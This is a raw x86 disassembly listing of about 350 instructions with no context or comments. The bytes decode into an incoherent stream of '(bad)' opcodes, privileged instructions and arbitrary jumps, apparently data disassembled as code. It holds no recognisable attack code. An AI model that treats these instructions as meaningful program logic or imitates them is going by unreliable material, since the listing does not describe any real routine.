  4aeb07:	jl     0x4aeb3c
  4aeb09:	test   BYTE PTR [ecx+0x41],dl
  4aeb0c:	popa   
  4aeb0d:	cmp    DWORD PTR [esi+0x24],ebx
  4aeb10:	nop
  4aeb11:	clc    
  4aeb12:	xchg   DWORD PTR ds:0x105e3821,ebp
  4aeb18:	mov    ds:0x2910a901,eax
  4aeb1d:	repz ficom WORD PTR [edi-0x2c]
  4aeb21:	dec    ebx
  4aeb22:	xchg   esp,esi
  4aeb24:	(bad)  
  4aeb25:	adc    BYTE PTR [edx-0x2e7e91fd],bh
  4aeb2b:	test   al,0x25
  4aeb2d:	jne    0x4aeb67
  4aeb2f:	mul    esp
  4aeb31:	mov    dh,0xc4
  4aeb33:	icebp  
  4aeb34:	addr16 inc edx
  4aeb36:	mov    bh,0x74
  4aeb38:	xor    al,0x7e
  4aeb3a:	fs mov eax,0x7d032c7e
  4aeb40:	gs add dh,0x6
  4aeb44:	xchg   esp,eax
  4aeb45:	cld    
  4aeb46:	jo     0x4aeaca
  4aeb48:	lock imul esp,DWORD PTR [edx-0x1417b2e2],0xdc16f785
  4aeb53:	mov    dl,0x7a
  4aeb55:	daa    
  4aeb56:	inc    edx
  4aeb57:	sbb    BYTE PTR [ecx-0x47],ch
  4aeb5a:	jnp    0x4aeb90
  4aeb5c:	hlt    
  4aeb5d:	dec    ebp
  4aeb5e:	or     BYTE PTR [edx-0x1bfbb145],ah
  4aeb64:	aam    0x6c
  4aeb66:	hlt    
  4aeb67:	pop    edx
  4aeb68:	cmp    DWORD PTR [edx],0xefc42478
  4aeb6e:	outs   dx,BYTE PTR ds:[esi]
  4aeb6f:	mov    ds:0xe54053a1,eax
  4aeb74:	cmp    cl,BYTE PTR [ecx-0x3df57126]
  4aeb7a:	jbe    0x4aeb84
  4aeb7c:	inc    ebx
  4aeb7d:	cmp    eax,esi
  4aeb7f:	jl     0x4aeb20
  4aeb81:	addr16 adc ah,dl
  4aeb84:	push   cs
  4aeb85:	pop    ecx
  4aeb86:	inc    ebx
  4aeb87:	or     DWORD PTR [eax+0x4d56a089],esp
  4aeb8d:	sbb    al,0x63
  4aeb8f:	sbb    BYTE PTR [edx-0x757b814e],al
  4aeb95:	cmp    BYTE PTR [ecx+0x100a1c39],cl
  4aeb9b:	test   eax,0x40903cd9
  4aeba0:	add    esi,0x20
  4aeba3:	xor    eax,esi
  4aeba5:	cdq    
  4aeba6:	retf   0x4286
  4aeba9:	adc    cl,BYTE PTR [esi]
  4aebab:	sbb    edx,DWORD PTR [edx-0x37d237f1]
  4aebb1:	dec    esp
  4aebb2:	push   edx
  4aebb3:	jae    0x4aeb81
  4aebb5:	cmp    DWORD PTR [eax],ecx
  4aebb7:	pop    eax
  4aebb8:	mov    dl,0x2e
  4aebba:	add    BYTE PTR [edi-0x258ef85],ah
  4aebc0:	mov    bh,ah
  4aebc2:	cmp    DWORD PTR [edx+0x4],ecx
  4aebc5:	dec    esp
  4aebc6:	xchg   ebx,eax
  4aebc7:	adc    ah,BYTE PTR [ecx+edx*1]
  4aebca:	fiadd  DWORD PTR [ecx+0x4ad4850]
  4aebd0:	adc    esp,ecx
  4aebd2:	std    
  4aebd3:	les    edx,FWORD PTR [ebx-0x77]
  4aebd6:	add    bl,BYTE PTR [esi]
  4aebd8:	jmp    0x5ac0067c
  4aebdd:	mov    ebp,0x7aec0f79
  4aebe2:	push   0x64
  4aebe4:	or     al,0x41
  4aebe6:	je     0x4aec23
  4aebe8:	jl     0x4aebb6
  4aebea:	jmp    0x4aec46
  4aebec:	cdq    
  4aebed:	nop
  4aebee:	adc    BYTE PTR [edx],al
  4aebf0:	rcl    BYTE PTR [ecx+eax*2+0x7b],cl
  4aebf4:	enter  0x87d8,0x8b
  4aebf8:	dec    ecx
  4aebf9:	sbb    eax,0x7ea24004
  4aebfe:	in     eax,dx
  4aebff:	pop    es
  4aec00:	fdivr  QWORD PTR [ebx]
  4aec02:	push   esp
  4aec03:	add    DWORD PTR [esi],edi
  4aec05:	pop    edx
  4aec06:	or     cl,BYTE PTR [eax]
  4aec08:	jg     0x4aec5e
  4aec0a:	or     edx,eax
  4aec0c:	out    dx,eax
  4aec0d:	xchg   ebp,eax
  4aec0e:	sub    eax,0x2b8528b
  4aec13:	mov    ecx,DWORD PTR [ecx]
  4aec15:	mov    ch,0xa1
  4aec17:	sub    DWORD PTR [ebx+ebp*2+0x47],ebx
  4aec1b:	inc    ebp
  4aec1c:	sbb    BYTE PTR [ebx-0x4fd29fc1],ah
  4aec22:	pop    ecx
  4aec23:	push   0x86b4c80c
  4aec28:	lea    esp,[ebx+0x31]
  4aec2b:	hlt    
  4aec2c:	repnz inc ecx
  4aec2e:	sbb    eax,0xa0748404
  4aec33:	rcl    BYTE PTR ds:0x1c4fad02,0x17
  4aec3a:	sbb    al,0x5
  4aec3c:	lea    ebp,[esi+0xd]
  4aec3f:	jne    0x4aec5b
  4aec41:	mov    ah,0x5c
  4aec43:	sbb    al,dh
  4aec45:	mov    bh,0x10
  4aec47:	add    al,0xb
  4aec49:	and    esp,DWORD PTR [eax]
  4aec4b:	xor    BYTE PTR [edx-0x1c],dl
  4aec4e:	addr16 dec esi
  4aec50:	test   BYTE PTR [edi-0x23fedc2a],0xe2
  4aec57:	jmp    0x1427:0x1348eaf8
  4aec5e:	adc    DWORD PTR [ecx+0x58224864],ebx
  4aec64:	(bad)  
  4aec65:	lock pop es
  4aec67:	inc    eax
  4aec68:	outs   dx,DWORD PTR ds:[esi]
  4aec69:	aaa    
  4aec6a:	add    eax,0x3798870f
  4aec6f:	adc    DWORD PTR [esi+0x45],eax
  4aec72:	cli    
  4aec73:	rcl    BYTE PTR [esi-0x27],1
  4aec76:	mov    es,WORD PTR [edi]
  4aec78:	add    al,0x40
  4aec7a:	inc    edx
  4aec7b:	sbb    al,0x98
  4aec7d:	push   ecx
  4aec7e:	mov    al,0xa5
  4aec80:	wbinvd 
  4aec82:	sub    bl,al
  4aec84:	mov    dl,0xfb
  4aec86:	sub    al,0x3c
  4aec88:	stc    
  4aec89:	fadd   DWORD PTR [ebp+0x40]
  4aec8c:	mov    eax,0x591a12cf
  4aec91:	call   0x53c83461
  4aec96:	cdq    
  4aec97:	(bad)
  4aec9b:	pop    edx
  4aec9c:	lahf   
  4aec9d:	shl    BYTE PTR [esi],cl
  4aec9f:	aaa    
  4aeca0:	xchg   ebx,eax
  4aeca1:	or     al,0xeb
  4aeca3:	push   ebp
  4aeca4:	sahf   
  4aeca5:	add    esp,edx
  4aeca7:	or     al,0x99
  4aeca9:	jne    0x4aec85
  4aecab:	pop    edi
  4aecac:	add    BYTE PTR [ecx+0x5f],al
  4aecaf:	or     bl,ch
  4aecb1:	aas    
  4aecb2:	sub    al,BYTE PTR [edx]
  4aecb4:	inc    esp
  4aecb5:	lods   al,BYTE PTR ds:[esi]
  4aecb6:	and    BYTE PTR [ecx],ch
  4aecb8:	int3   
  4aecb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aecba:	dec    ebp
  4aecbb:	add    eax,0x57ff07ea
  4aecc0:	mov    esp,0x7b4905f8
  4aecc5:	in     eax,0x2d
  4aecc7:	sub    al,0x98
  4aecc9:	mov    ds:0x8011eba8,eax
  4aecce:	add    esp,ebx
  4aecd0:	inc    edx
  4aecd1:	sbb    ebp,DWORD PTR [ecx+0x10]
  4aecd4:	loopne 0x4aed19
  4aecd6:	ficomp DWORD PTR [eax]
  4aecd8:	pushf  
  4aecd9:	xchg   BYTE PTR [edi],cl
  4aecdb:	mov    ah,0x3b
  4aecdd:	pop    ebp
  4aecde:	adc    BYTE PTR [esp+ebp*1],bh
  4aece1:	stc    
  4aece2:	clc    
  4aece3:	shl    ebx,1
  4aece5:	inc    eax
  4aece6:	test   BYTE PTR [edi+0x52],al
  4aece9:	mov    bh,0x50
  4aeceb:	or     eax,0x83494210
  4aecf0:	mov    ds:0x626e04f8,eax
  4aecf5:	add    DWORD PTR [ecx+0x4eb93c8],edx
  4aecfb:	lea    esi,[ebx-0x10]
  4aecfe:	add    esi,DWORD PTR [edi+0x73]
  4aed01:	loop   0x4aed2c
  4aed03:	cli    
  4aed04:	pop    eax
  4aed05:	leave  
  4aed06:	cmp    dh,BYTE PTR [esi]
  4aed08:	inc    eax
  4aed09:	or     BYTE PTR [ebp+0x3005705c],bl
  4aed0f:	mov    eax,fs:0xdd5e7c4e
  4aed15:	inc    eax
  4aed16:	sbb    edx,DWORD PTR [ecx+eiz*4+0x49]
  4aed1a:	mov    al,0xec
  4aed1c:	cmp    dh,ch
  4aed1e:	and    BYTE PTR [ebx+0x57],dl
  4aed21:	in     al,dx
  4aed22:	jmp    0x4aed6b
  4aed24:	push   0xfffffffd
  4aed26:	or     DWORD PTR [ebx],eax
  4aed28:	mov    cl,0x45
  4aed2a:	por    mm6,QWORD PTR [eax+ebp*1]
  4aed2e:	add    esi,ecx
  4aed30:	and    BYTE PTR [edi+0x449670a4],ah
  4aed36:	repnz mov al,ds:0xdedec308
  4aed3c:	mov    bl,0xad
  4aed3e:	jne    0x4aed58
  4aed40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4aed41:	das    
  4aed42:	inc    eax
  4aed43:	sbb    edx,DWORD PTR [ecx]
  4aed45:	imul   ecx,DWORD PTR [ebx+0x3d],0x1
  4aed49:	imul   esp,ebx,0x7c1a7eff
  4aed4f:	dec    eax
  4aed50:	rol    DWORD PTR [esi+eax*8+0x28c8043e],0x5e
  4aed58:	dec    edx
  4aed59:	push   esp
  4aed5a:	or     BYTE PTR [ebx+0x6],bh
  4aed5d:	jne    0x4aed48
  4aed5f:	adc    DWORD PTR [ecx-0x71],esi
  4aed62:	push   ss
  4aed63:	stc    
  4aed64:	and    al,BYTE PTR [edx]
  4aed66:	mov    eax,ds:0xeb09f1d9
  4aed6b:	jb     0x4aedc2
  4aed6d:	clc    
  4aed6e:	rol    BYTE PTR [edx-0x60932759],1
  4aed74:	not    DWORD PTR [eax-0x1973bb3e]
  4aed7a:	jae    0x4aed6e
  4aed7c:	mov    esp,0xed5c06ac
  4aed81:	(bad)  [esi+0x45]
  4aed84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4aed85:	sar    DWORD PTR [ecx-0x62],cl
  4aed88:	imul   edx,DWORD PTR [ebp+0x701d9684],0x32
  4aed8f:	xchg   esp,eax
  4aed90:	xchg   edi,eax
  4aed91:	mov    al,ds:0x4ac26a1f
  4aed96:	test   DWORD PTR [ebx+eiz*2+0x5054f01c],ecx
  4aed9d:	inc    eax
  4aed9e:	xchg   ebx,eax
  4aed9f:	adc    al,0x8
  4aeda1:	mov    al,ds:0x8f527e80
  4aeda6:	dec    esp
  4aeda7:	push   esp
  4aeda8:	retf   0x963d
  4aedab:	jbe    0x4aedb7
  4aedad:	cmp    edx,DWORD PTR [eax]
  4aedaf:	inc    edx
  4aedb0:	outs   dx,DWORD PTR ds:[esi]
  4aedb1:	mov    ebp,0xb82a8054
  4aedb6:	out    dx,al
  4aedb7:	inc    edx
  4aedb8:	push   edx
  4aedb9:	dec    eax
  4aedba:	loopne 0x4aeda0
  4aedbc:	sub    eax,0x7b596812
  4aedc1:	pop    es
  4aedc2:	inc    ebx
  4aedc3:	pushf  
  4aedc4:	(bad)  
  4aedc6:	inc    edx
  4aedc7:	inc    esp
  4aedc8:	cmp    eax,0xba69e7e7
  4aedcd:	cmp    BYTE PTR [edi],ch
  4aedcf:	inc    esi
  4aedd0:	jmp    0x517f3c25
  4aedd5:	lock mov ah,0x2
  4aedd8:	adc    esp,esp
  4aedda:	and    BYTE PTR [eax+0x1dee66e0],bl
  4aede0:	mov    DWORD PTR [edi],eax
  4aede2:	sub    dh,bl
  4aede4:	inc    esi
  4aede5:	int3   
  4aede6:	(bad)  
  4aede8:	or     DWORD PTR [eax+0x1ed751dd],eax
  4aedee:	pop    eax
  4aedef:	adc    esp,DWORD PTR [edx+ebp*4+0x7886fb0c]
  4aedf6:	lds    esi,FWORD PTR [ebx]
  4aedf8:	push   ecx
  4aedf9:	push   esp
  4aedfa:	push   ss
  4aedfb:	xchg   ecx,eax
  4aedfc:	pop    edx
  4aedfd:	adc    BYTE PTR [esi-0x4b],ch
  4aee00:	inc    ebx
  4aee01:	(bad)  
  4aee02:	daa    
  4aee03:	mov    eax,0x7249a6e8
  4aee08:	test   al,0x5e
  4aee0a:	ss jp  0x4aee60
  4aee0d:	lock mov bl,al
  4aee10:	ds loopne 0x4aee55
  4aee13:	add    al,0x7c
  4aee15:	cli    
  4aee16:	inc    esi
  4aee17:	push   esi
  4aee18:	sub    edi,ecx
  4aee1a:	out    dx,eax
  4aee1b:	xchg   ecx,eax
  4aee1c:	push   0x30930ac
  4aee21:	sub    DWORD PTR [eax+0x6],edi
  4aee24:	es mov dh,0xc
  4aee27:	sbb    DWORD PTR [ebp-0x3c],esi
  4aee2a:	add    ah,BYTE PTR [eax]
  4aee2c:	ds pop es
  4aee2e:	shr    DWORD PTR [ebx+0x11],0xf8
  4aee32:	mov    al,ds:0x16161188
  4aee37:	into   
  4aee38:	stc    
  4aee39:	push   ss
  4aee3a:	pop    esp
  4aee3b:	out    dx,al
  4aee3c:	inc    edx
  4aee3d:	add    al,0xbd
  4aee3f:	(bad)  
  4aee40:	push   cs
  4aee41:	(bad)  
  4aee43:	call   0x22abaf6d
  4aee48:	adc    eax,0xd37516b7
  4aee4d:	mov    eax,0xfad80183
  4aee52:	inc    eax
  4aee53:	push   eax
  4aee54:	add    bh,BYTE PTR [eax*1-0x6e43374a]
  4aee5b:	and    DWORD PTR [eax+eax*8-0x18],esi
  4aee5f:	vpsubw xmm5,xmm5,xmm3
  4aee63:	add    edx,DWORD PTR [eax+0x73]
  4aee66:	repz pop ebx
  4aee68:	push   0x32
  4aee6a:	xor    BYTE PTR [edi+ecx*1-0xc],0x2b
  4aee6f:	(bad)  
  4aee70:	in     al,dx
  4aee71:	fs imul eax,ebx,0x4d8f6d08
  4aee78:	xor    bl,BYTE PTR [esi+0x51bc9315]
  4aee7e:	or     eax,0xee1680b5
  4aee83:	push   esi
  4aee84:	push   esp
  4aee85:	ret    0x83d7
  4aee88:	mov    DWORD PTR [ebx],edi
  4aee8a:	sbb    esi,DWORD PTR es:[esi+0x612666ea]
  4aee91:	xor    DWORD PTR [edx+0x25107238],0xffffffec
  4aee98:	or     DWORD PTR [ebp+0x303d4e8],edi
  4aee9e:	push   0x5
  4aeea0:	fmul   QWORD PTR [ecx]
  4aeea2:	inc    ecx
  4aeea3:	cmp    DWORD PTR [ebp+0x50],ecx
  4aeea6:	pop    esi
  4aeea7:	sbb    BYTE PTR [ebx+0x38],bl
  4aeeaa:	cld    
  4aeeab:	adc    DWORD PTR [ecx+esi*1+0x39],ecx
  4aeeaf:	fld    QWORD PTR [esi+0x18]
  4aeeb2:	outs   dx,BYTE PTR ds:[esi]
  4aeeb3:	fadd   st,st(2)
  4aeeb5:	or     edx,DWORD PTR [eax-0xd]
  4aeeb8:	push   0xffffffe4
  4aeeba:	add    BYTE PTR [ebp+0x15fcef89],al
  4aeec0:	mov    ah,0xd5
  4aeec2:	pop    ss
  4aeec3:	and    eax,0x1cb20a98
  4aeec8:	or     ah,BYTE PTR [esp+edx*2]
  4aeecb:	call   0x369a:0x58e0ea68
  4aeed2:	add    dh,BYTE PTR [edi+0x76b29831]
  4aeed8:	lea    eax,[ecx+0x3e]
  4aeedb:	inc    esi
  4aeedc:	js     0x4aef0a
  4aeede:	add    al,dl
  4aeee0:	mov    esi,0xc730bcbf
  4aeee5:	sbb    BYTE PTR [ebx],bh
  4aeee7:	jmp    0x4aef09
  4aeee9:	jne    0x4aef2b
  4aeeeb:	xor    ebp,ebp
  4aeeed:	and    BYTE PTR ds:0xc7f6d1,dh
  4aeef3:	rcl    BYTE PTR [edx-0x5c],1
  4aeef6:	mov    DWORD PTR [eax-0x55],0x2189ae70
  4aeefd:	hlt    
  4aeefe:	in     eax,dx
  4aeeff:	push   0xffffffa4
  4aef01:	inc    edi
  4aef02:	or     esi,DWORD PTR [ecx]
  4aef04:	inc    ebp
  4aef05:	fisubr DWORD PTR [ecx+0x2c]
  4aef08:	cmp    DWORD PTR [edx],ecx
  4aef0a:	cmp    ecx,DWORD PTR [ebx+0x13]
  4aef0d:	cmp    DWORD PTR es:[eax],ecx
  4aef10:	push   ebx
  4aef11:	or     al,0xf5
  4aef13:	jbe    0x4aef31
  4aef15:	nop
  4aef16:	and    cl,ch
  4aef18:	push   cs
  4aef19:	dec    eax
  4aef1a:	jl     0x4aeea2
  4aef1c:	push   esi
  4aef1d:	ss in  al,0x41
  4aef20:	cmp    bl,dl
  4aef22:	lods   al,BYTE PTR ds:[esi]
  4aef23:	aaa    
  4aef24:	int3   
  4aef25:	dec    edx
  4aef26:	jb     0x4aef9d
  4aef28:	cmp    DWORD PTR [ebp-0x345529de],eax
  4aef2e:	mov    ebp,0xc6c2e00a
  4aef33:	or     BYTE PTR [esi],ah
  4aef35:	push   esp
  4aef36:	jbe    0x4aef5c
  4aef38:	icebp  
  4aef39:	cmp    cl,BYTE PTR [esi]
  4aef3b:	fs or  al,0x9e
  4aef3e:	mov    bh,0x4e
  4aef40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4aef41:	push   es
  4aef42:	stos   BYTE PTR es:[edi],al
  4aef43:	push   eax
  4aef44:	mov    esi,0x54c9c206
  4aef49:	xor    BYTE PTR [esi+0x5e],ah
  4aef4c:	ret    0x3cd3
  4aef4f:	mov    ch,0xae
  4aef51:	and    dl,BYTE PTR [esp+0x40]
  4aef55:	(bad)  
  4aef56:	rcl    BYTE PTR [bp+di],0x4d
  4aef5a:	bound  eax,QWORD PTR [eax+0x518d5f3b]
  4aef60:	push   es
  4aef61:	push   edi
  4aef62:	gs mov esp,0x2014f781
  4aef68:	push   es
  4aef69:	sub    al,0xf0
  4aef6b:	xchg   edx,eax
  4aef6c:	or     BYTE PTR [edi-0x49],0xc4
  4aef70:	sub    BYTE PTR [ebp+0x2b],dh
  4aef73:	adc    bl,BYTE PTR ss:[esi+0x20]
  4aef77:	adc    DWORD PTR [esp+edi*1],ebp
  4aef7a:	cs test ah,bl
  4aef7d:	sub    edx,DWORD PTR [esi+ecx*8]
  4aef80:	inc    esi
  4aef81:	and    BYTE PTR [esi],dh
  4aef83:	lea    ecx,[edx]
  4aef85:	push   dx
  4aef87:	inc    eax
  4aef88:	imul   eax,DWORD PTR [eax],0xe14e944f
  4aef8e:	pop    esi
  4aef8f:	jnp    0x4aefbf
  4aef91:	push   esp
  4aef92:	cs dec eax
  4aef94:	adc    al,BYTE PTR [edx]
  4aef96:	or     al,0x4c
  4aef98:	sbb    ch,BYTE PTR [eax+ecx*8]
  4aef9b:	mov    ebp,0x5c8d0237
  4aefa0:	or     eax,DWORD PTR [ebx]
  4aefa2:	sbb    dh,BYTE PTR [eax]
  4aefa4:	out    0x32,eax
  4aefa6:	add    BYTE PTR [edi-0x20],ch
  4aefa9:	pusha  
  4aefaa:	aam    0x36
  4aefac:	add    DWORD PTR [ebx+eiz*2-0x35],ecx
  4aefb0:	and    BYTE PTR [esi+eax*8-0x73783d38],dl
  4aefb7:	cld    
  4aefb8:	pop    es
  4aefb9:	or     dh,BYTE PTR [eax]
  4aefbb:	pop    ebx
  4aefbc:	pop    edi
  4aefbd:	sub    BYTE PTR [esp],dl
  4aefc0:	pop    es
  4aefc1:	ins    BYTE PTR es:[edi],dx
  4aefc2:	pushf  
  4aefc3:	or     DWORD PTR [ecx+0x3c],0x41
  4aefc7:	stc    
  4aefc8:	push   ebx
  4aefc9:	(bad)  
  4aefca:	mov    bh,0x35
  4aefcc:	enter  0xde62,0x19
  4aefd0:	cs pop esp
  4aefd2:	inc    ebx
  4aefd3:	sbb    bh,BYTE PTR [eax]
  4aefd5:	inc    ax
  4aefd7:	mov    eax,ds:0x3da206dc
  4aefdc:	add    ebp,DWORD PTR [esp+esi*2-0x20]
  4aefe0:	or     BYTE PTR [eax-0x2b9c3856],ah
  4aefe6:	and    ebp,DWORD PTR [edx+0x6]
  4aefe9:	aam    0x16
  4aefeb:	mov    esp,0x6f260b2
  4aeff0:	out    dx,al
  4aeff1:	add    cl,BYTE PTR [eax-0x73]
  4aeff4:	loop   0x4af043
  4aeff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4aeff7:	sbb    DWORD PTR [ebp+0x2c141227],edx
  4aeffd:	cmp    BYTE PTR [edx+0x4b12a008],dh
  4af003:	sar    BYTE PTR [edi+0x2ac6513],cl
  4af009:	loope  0x4aeffb
  4af00b:	(bad)  
  4af00c:	sub    BYTE PTR [eax+0x44],cl
  4af00f:	outs   dx,DWORD PTR ds:[esi]
  4af010:	das    
  4af011:	dec    eax
  4af012:	sub    esp,DWORD PTR [edx]
  4af014:	loopne 0x4af01d
  4af016:	shl    DWORD PTR [ebx+edi*1],cl
  4af019:	je     0x4af099
  4af01b:	or     DWORD PTR [edi+0x2c],esi
  4af01e:	push   edx
  4af01f:	pop    ebp
  4af020:	ret    
  4af021:	dec    edi
  4af022:	add    BYTE PTR [edx-0x540019ce],bh
  4af028:	xchg   edx,eax
  4af029:	jp     0x4aefdd
  4af02b:	sub    DWORD PTR [eax+0x40c38712],0x94843078
  4af035:	inc    edi
  4af036:	lea    eax,[edx]
  4af038:	sahf   
  4af039:	ja     0x4af053
  4af03b:	jmp    0x4af094
  4af03d:	and    ch,BYTE PTR [eax]
  4af03f:	xor    al,0xe6
  4af041:	pop    ss
  4af042:	or     ebx,DWORD PTR [ecx]
  4af044:	or     eax,DWORD PTR [eax]
  4af046:	pop    edx
  4af047:	fldl2t 
  4af049:	push   eax
  4af04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4af04b:	pop    edx
  4af04c:	jge    0x4aefd0
  4af04e:	dec    esp
  4af04f:	stos   DWORD PTR es:[edi],eax
  4af050:	xchg   ecx,eax
  4af051:	dec    ecx
  4af052:	ins    BYTE PTR es:[edi],dx
  4af053:	dec    esp
  4af054:	mov    edx,edx
  4af056:	js     0x4af0b9
  4af058:	out    dx,al
  4af059:	xlat   BYTE PTR ds:[ebx]
  4af05a:	pushf  
  4af05b:	xchg   esi,eax
  4af05c:	loopne 0x4af022
  4af05e:	retf   0x2432
  4af061:	jmp    0x4af067
  4af063:	pop    ds
  4af064:	xor    BYTE PTR [esi+0x41],cl
  4af067:	sbb    DWORD PTR [esi-0x7c],ecx
  4af06a:	sbb    eax,0xc8ca9051
  4af06f:	lock or ch,cl
  4af072:	shl    DWORD PTR ds:0x36185ae5,0x9
  4af079:	jbe    0x4af070
  4af07b:	aaa    
  4af07c:	cmp    eax,0xaa4ce10d
  4af081:	loop   0x4af00e
  4af083:	add    edx,eax
  4af085:	gs scas al,BYTE PTR es:[edi]
  4af087:	xchg   ebp,eax
  4af088:	cmp    al,0xf
  4af08a:	inc    ebp
  4af08b:	call   0x8f48e913
  4af090:	push   esp
  4af091:	add    DWORD PTR [edx],edx
  4af093:	add    al,0xc
  4af095:	xlat   BYTE PTR ds:[ebx]
  4af096:	pusha  
  4af097:	loopne 0x4af0fa
  4af099:	xchg   esp,eax
  4af09a:	push   cs
  4af09b:	xchg   ebx,eax
  4af09c:	jb     0x4af0f7
  4af09e:	pop    ds
  4af09f:	iret   
  4af0a0:	xor    BYTE PTR [edx-0x62edcb25],bh
  4af0a6:	enter  0x757c,0x6a
  4af0aa:	outs   dx,DWORD PTR ds:[esi]
  4af0ab:	pop    eax
  4af0ac:	das    
  4af0ad:	sbb    edi,DWORD PTR [edx+0x1b]
  4af0b0:	push   esi
  4af0b1:	mov    ah,0xf
  4af0b3:	or     ebp,esp
  4af0b5:	ins    DWORD PTR es:[edi],dx
  4af0b6:	dec    DWORD PTR [eax]
  4af0b8:	adc    al,0x26
  4af0ba:	or     BYTE PTR [ebx],al
  4af0bc:	mov    ebp,0x8a042c08
  4af0c1:	cmp    ebx,esp
  4af0c3:	inc    esp
  4af0c4:	pop    ecx
  4af0c5:	jg     0x4af0d1
  4af0c7:	mov    eax,0xcb8a54b2
  4af0cc:	jmp    FWORD PTR [edx]
  4af0ce:	enter  0x19ef,0xee
  4af0d2:	push   eax
  4af0d3:	inc    esi
  4af0d4:	adc    DWORD PTR [esi+ecx*8+0x57],ebx
  4af0d8:	dec    edi
  4af0d9:	(bad)  
  4af0db:	inc    ebx
  4af0dc:	push   eax
  4af0dd:	and    al,0xe8
  4af0df:	(bad)  
  4af0e0:	jns    0x4af084
  4af0e2:	shl    DWORD PTR [ebx-0x3f7c0a20],0xf8
  4af0e9:	add    eax,ebx
  4af0eb:	out    0x66,al
  4af0ed:	inc    ecx
  4af0ee:	or     dh,BYTE PTR [ecx]
  4af0f0:	mov    al,ds:0x1adb6f10
  4af0f5:	pop    edx
  4af0f6:	das    
  4af0f7:	mov    esi,0x80eb4d64
  4af0fc:	and    BYTE PTR [eax+0x2c7c08b7],0x60
  4af103:	clc    
  4af104:	mov    bl,0x48
  4af106:	add    ah,BYTE PTR [edi]
  4af108:	enter  0x2970,0x7e
  4af10c:	jo     0x4af0c0
  4af10e:	xor    eax,DWORD PTR [ecx-0x1f803a7b]
  4af114:	addr16 and al,0x63
  4af117:	add    cl,bh
  4af119:	add    al,0xda
  4af11b:	clc    
  4af11c:	push   ebp
  4af11d:	imul   ecx,DWORD PTR [esp+edi*1-0x64],0x7853f806
  4af125:	cmp    al,0x3a
  4af127:	and    eax,0x2043a7a2
  4af12c:	enter  0x4606,0x1
  4af130:	or     eax,0x4552001a
  4af135:	push   edx
  4af136:	and    eax,0x906f7e04
  4af13b:	aam    0xf0
  4af13d:	pop    eax
  4af13e:	push   esp
  4af13f:	mov    BYTE PTR [ecx],0x5d
  4af142:	pop    DWORD PTR [edx]
  4af144:	inc    esi
  4af145:	push   ds
  4af146:	jmp    DWORD PTR [esi+0x167b012c]
  4af14c:	jo     0x4af153
  4af14e:	mov    ch,BYTE PTR [edx]
  4af150:	cmp    BYTE PTR [edx],bl
  4af152:	or     ch,BYTE PTR [ebp+ebx*8-0x6f7087c9]
  4af159:	int3   
  4af15a:	adc    BYTE PTR [eax-0x4aee746a],ah
  4af160:	rcr    ah,0x33
  4af163:	adc    al,0x8
  4af165:	cmp    al,0x20
  4af167:	bound  ebx,QWORD PTR [edi]
  4af169:	aaa    
  4af16a:	sub    DWORD PTR [edx],edi
  4af16c:	xchg   bl,ch
  4af16e:	sbb    eax,DWORD PTR [ecx+edx*1]
  4af171:	sub    ah,cl
  4af173:	or     BYTE PTR [ebp+0x12],cl
  4af176:	or     DWORD PTR [eax+0x297118a1],ebx
  4af17c:	js     0x4af141
  4af17e:	jnp    0x4af1e9
  4af180:	and    al,0x24
  4af182:	sbb    eax,0x2e02c053
  4af187:	xor    BYTE PTR [esi-0x5ce483e4],cl
  4af18d:	retfw  0xf71a
  4af191:	out    0xa9,al
  4af193:	mov    esp,0x1028a646
  4af198:	sub    BYTE PTR [eax+ebx*1],ch
  4af19b:	and    ah,al
  4af19d:	xchg   esi,eax
  4af19e:	push   cs
  4af19f:	fdiv   QWORD PTR [esi+0x7a490ab6]
  4af1a5:	in     eax,0xe2
  4af1a7:	jge    0x4af181
  4af1a9:	inc    ebp
  4af1aa:	sbb    BYTE PTR [esi-0x7e4d93ca],al
  4af1b0:	dec    edi
  4af1b1:	(bad)  
  4af1b2:	sub    ah,BYTE PTR [ebx-0x5af0efaf]
  4af1b8:	bndstx [ebx+0x4e8feb92],(bad)
  4af1bf:	mov    dl,0xc
  4af1c1:	test   al,0x87
  4af1c3:	rcr    DWORD PTR [esi+0x6c],cl
  4af1c6:	adc    BYTE PTR ds:0x891f4f8,dl
  4af1cc:	add    al,0x58
  4af1ce:	cmp    BYTE PTR ds:0x326867b6,cl
  4af1d4:	mov    al,ds:0xda5ef5a4
  4af1d9:	mov    BYTE PTR [esi-0x56e7c8ab],0xd8
  4af1e0:	(bad)  
  4af1e1:	sbb    DWORD PTR ds:0xc966bc69,esi
  4af1e7:	(bad)  
  4af1e8:	and    eax,0x46fe82ce
  4af1ed:	jmp    0x4af22c
  4af1ef:	xor    BYTE PTR [eax],dl
  4af1f1:	ja     0x4af264
  4af1f3:	je     0x4af231
  4af1f5:	sub    eax,0xd4b4f000
  4af1fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4af1fb:	sbb    BYTE PTR [eax-0x59787ad4],bl
  4af201:	out    dx,eax
  4af202:	lahf   
  4af203:	rcr    BYTE PTR [edx],cl
  4af205:	lods   al,BYTE PTR ds:[esi]
  4af206:	cld    
  4af207:	in     eax,0x5e
  4af209:	xchg   edx,eax
  4af20a:	into   
  4af20b:	test   BYTE PTR ds:0xb1011e40,0x80
  4af212:	imul   ecx,DWORD PTR [ebx],0xffffffc5
  4af215:	call   0x4181:0x41b94d24
  4af21c:	add    ebx,ebp
  4af21e:	pop    ebx
  4af21f:	pop    edx
  4af220:	cli    
  4af221:	and    cl,cl
  4af223:	in     al,dx
  4af224:	mov    bh,0x51
  4af226:	jne    0x4af284
  4af228:	jmp    0x4af269
  4af22a:	aaa    
  4af22b:	std    
  4af22c:	xor    al,0xde
  4af22e:	jge    0x4af279
  4af230:	loope  0x4af26f
  4af232:	pusha  
  4af233:	fucom  st(2)
  4af235:	cmp    eax,0x929af120
  4af23a:	fstp   DWORD PTR [ebx-0x64]
  4af23d:	cmp    ebx,0x307dd61b
  4af243:	add    BYTE PTR ds:0xe2126856,cl
  4af249:	ja     0x4af24c
  4af24b:	mov    edx,DWORD PTR [ecx-0x7f7cb66b]
  4af251:	test   BYTE PTR [ecx+0x1b49be81],al
  4af257:	push   eax
  4af258:	sub    eax,0xc43b65d1
  4af25d:	aam    0x81
